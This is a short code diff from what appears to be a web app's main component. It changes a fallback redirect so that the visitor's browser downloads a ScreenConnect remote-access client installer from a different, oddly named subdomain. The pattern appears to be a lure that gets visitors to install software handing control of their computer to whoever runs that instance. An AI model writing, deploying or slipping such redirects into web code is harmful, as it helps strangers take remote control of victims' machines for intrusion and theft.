@@ -224,7 +224,7 @@ export default function App() {
       window.location.href = redirectUrl;
     } else {
       // Fallback
-      window.location.href = "https://professionalgfx.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+      window.location.href = "https://almarabeaunited2.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
     }
   };
 
